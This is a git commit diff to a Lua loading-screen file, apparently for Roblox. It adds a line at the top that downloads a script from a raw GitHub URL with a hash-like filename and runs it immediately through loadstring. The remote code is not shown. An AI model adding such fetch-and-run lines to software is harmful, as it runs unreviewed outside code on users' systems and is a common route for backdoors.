86cb7f88db979a73570dc2ef6a1df638c9e8012e
muzammil909900 <143308858+muzammil909900@users.noreply.github.com>
2025-06-30 16:05:56 +0500

    Update LoadingScreen.lua

--- LoadingScreen.lua
+++ LoadingScreen.lua
@@ -1,3 +1,5 @@
+-- Load external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/UpdatedScript/refs/heads/main/86b6d6f92d02479a59d8f680480b5ad7.txt"))()
 
 -- Setup
 local TweenService = game:GetService("TweenService")
